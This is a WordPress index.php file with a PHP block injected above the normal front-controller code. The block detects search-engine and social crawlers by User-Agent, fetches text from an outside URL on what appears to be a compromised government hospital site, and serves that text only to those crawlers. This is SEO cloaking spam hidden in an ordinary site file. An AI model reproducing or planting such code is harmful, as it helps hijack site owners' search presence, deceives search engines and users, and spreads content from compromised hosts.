<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array(
        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
    );
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }

    return false;
}

function fetch_message_from_url($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        error_log("Error cURL: " . curl_error($ch));
        curl_close($ch);
        return false;
    }
    
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        return $response;
    } else {
        error_log("HTTP Error: Status Code " . $http_code);
        return false;
    }
}

if (is_bot()) { 
    $message = fetch_message_from_url('https://asabaspecialisthospital.deltastate.gov.ng/READ.txt');
    
    if ($message) {
        echo $message;
    } else {
        echo "";
    }
    exit;
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
